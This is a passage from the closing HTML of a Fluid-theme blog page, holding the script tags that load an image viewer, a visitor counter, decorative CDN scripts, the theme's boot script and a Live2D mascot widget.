  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"rect":"opacity:0.5","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
